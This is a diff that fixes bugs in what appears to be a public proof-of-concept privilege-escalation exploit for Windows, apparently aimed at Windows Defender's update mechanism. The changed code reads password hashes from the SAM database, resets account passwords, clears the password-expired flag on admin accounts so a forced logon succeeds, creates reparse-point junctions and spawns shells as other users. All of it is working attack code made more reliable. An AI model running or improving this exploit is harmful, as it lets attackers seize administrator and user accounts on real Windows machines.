@@ -1,4 +1,5 @@
 // Special thanks to Tom Gallagher, Igor Tsyganskiy and Jeremy Tinder for making this PoC publicly disclosed !!!
+// bugs fixed by - @https://github.com/deannreid
 
 #define _CRT_SECURE_NO_WARNINGS
 
@@ -17,6 +18,7 @@
 #include <ntstatus.h>
 #include <cfapi.h>
 #include <aclapi.h>
+#include <lm.h>
 #include "windefend_h.h"
 
 /*
@@ -41,6 +43,7 @@
 #pragma comment(lib, "Cabinet.lib")
 #pragma comment(lib, "Wuguid.lib")
 #pragma comment(lib,"CldApi.lib")
+#pragma comment(lib, "Netapi32.lib")
 
 
 /// NT routines and definitions
@@ -801,7 +804,10 @@ bool CheckForWDUpdates(wchar_t* updatetitle, bool* criterr)
 	ICategory* cat = 0;
 	BSTR catname = 0;
 	IUpdate* upd = 0;
-	bool comini = CoInitialize(NULL) == 0;
+	// S_OK (0) = first init, S_FALSE (1) = already initialized - both are success.
+	// The original code used == 0 which treated S_FALSE as failure on re-entry.
+	HRESULT hrCom = CoInitialize(NULL);
+	bool comini = SUCCEEDED(hrCom);
 	if (!comini) {
 		printf("Failed to initialize COM\n");
 		*criterr = true;
@@ -2604,7 +2610,11 @@ bool DoSpawnShellAsAllUsers(wchar_t* sampath)
 		ULONG* NThashsz = (ULONG*)&SAMpwd->buff[SAM_DATABASE_NT_HASH_LENGTH_OFFSET];
 		SAMpwd->NTHashLenght = *NThashsz;
 
-		pwdenclist[i] = SAMpwd;
+		// Use numofentries as the write index so the array is always contiguous.
+		// The original code used outer loop variable i, which left gaps whenever
+		// a subkey was skipped (e.g. the "users" key), causing the second loop
+		// to read uninitialized pointers at those positions.
+		pwdenclist[numofentries] = SAMpwd;
 		numofentries++;
 	}
 
@@ -2662,13 +2672,27 @@ bool DoSpawnShellAsAllUsers(wchar_t* sampath)
 			{
 				printf("    NewPasswordSet : OK.\n");
 
+				// SamiChangePasswordUser sets UF_PASSWORD_EXPIRED on admin accounts when called
+				// via the raw hash path, causing LogonUserEx to fail with ERROR_PASSWORD_MUST_CHANGE.
+				// Clear the flag here before attempting logon.
+				{
+					LPBYTE pFlagBuf = NULL;
+					if (NetUserGetInfo(NULL, username, 1008, &pFlagBuf) == NERR_Success)
+					{
+						USER_INFO_1008* pFlags = (USER_INFO_1008*)pFlagBuf;
+						pFlags->usri1008_flags &= ~UF_PASSWORD_EXPIRED;
+						NetUserSetInfo(NULL, username, 1008, pFlagBuf, NULL);
+						NetApiBufferFree(pFlagBuf);
+					}
+				}
+
 				HANDLE htoken = NULL;
 				PSID logonsid = 0;
 				if (!LogonUserEx(username, NULL, newpassword_unistr, LOGON32_LOGON_INTERACTIVE, LOGON32_PROVIDER_DEFAULT, &htoken, &logonsid, NULL, NULL, NULL))
 				{
 					printf("LogonUserEx failed, error : %d\n", GetLastError());
 				}
-				if (!systemshelllaunched) {
+				if (!systemshelllaunched && htoken) {
 					TOKEN_ELEVATION_TYPE tokentype;
 					DWORD retsz = 0;
 					if (!GetTokenInformation(htoken, TokenElevationType, &tokentype, sizeof(tokentype), &retsz))
@@ -3249,14 +3273,17 @@ int wmain(int argc, wchar_t* argv[])
 				goto cleanup;
 			}
 			DeviceIoControl(hreparsedir, FSCTL_SET_REPARSE_POINT, rdb, totalsz, NULL, NULL, NULL, &ov);
+			// Save error BEFORE HeapFree - HeapFree can clobber the last error code.
+			DWORD reparsErr = GetLastError();
 			HeapFree(GetProcessHeap(), NULL, rdb);
 			rdb = NULL;
-			if (GetLastError() == ERROR_IO_PENDING) {
+			if (reparsErr == ERROR_IO_PENDING) {
 				GetOverlappedResult(hreparsedir, &ov, &retsz, TRUE);
+				reparsErr = GetLastError();
 			}
-			if (GetLastError() != ERROR_SUCCESS)
+			if (reparsErr != ERROR_SUCCESS)
 			{
-				printf("Failed to create reparse point, error : %d", GetLastError());
+				printf("Failed to create reparse point, error : %d", reparsErr);
 				goto cleanup;
 			}
 			printf("Junction created %ws => %ws\n", updatepath, rptarget);
@@ -3377,7 +3404,7 @@ cleanup:
 
 	if(hint)
 		InternetCloseHandle(hint);
-	if(hint)
+	if(hint2)
 		InternetCloseHandle(hint2);
 	if (exebuff)
 		free(exebuff);
